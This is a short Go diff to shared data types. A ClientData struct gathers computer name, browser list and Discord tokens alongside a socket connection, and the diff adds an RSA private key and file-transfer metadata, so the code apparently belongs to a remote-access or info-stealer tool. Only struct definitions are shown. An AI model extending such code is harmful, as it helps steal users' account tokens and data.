@@ -1,6 +1,9 @@
 package common
 
-import "net"
+import (
+	"crypto/rsa"
+	"net"
+)
 
 type ClientData struct {
 	ComputerName    string `json:"computer_name"`
@@ -31,14 +34,20 @@ type ClientData struct {
 	Webbrowsers   []string   `json:"webbrowsers"`
 	DiscordTokens [][]string `json:"discord_tokens"`
 
-	Addr   net.Addr
-	Socket net.Conn
+	Addr   net.Addr `json:"-"`
+	Socket net.Conn `json:"-"`
+
+	PrivateKey rsa.PrivateKey `json:"private_key"`
 }
 
 type FileData struct {
-	FileName string `json:"file_name"`
-	FileSize int64  `json:"file_size"`
-	FileType string `json:"file_type"`
+	FileName      string `json:"file_name"`
+	FileExtension string `json:"file_extension"`
+	FileSize      int64  `json:"file_size"`
+	FileType      string `json:"file_type"`
+
+	// Other metadata added afterwards
+	FileURL string `json:"file_url"`
 }
 
 type FileDataChunk struct {
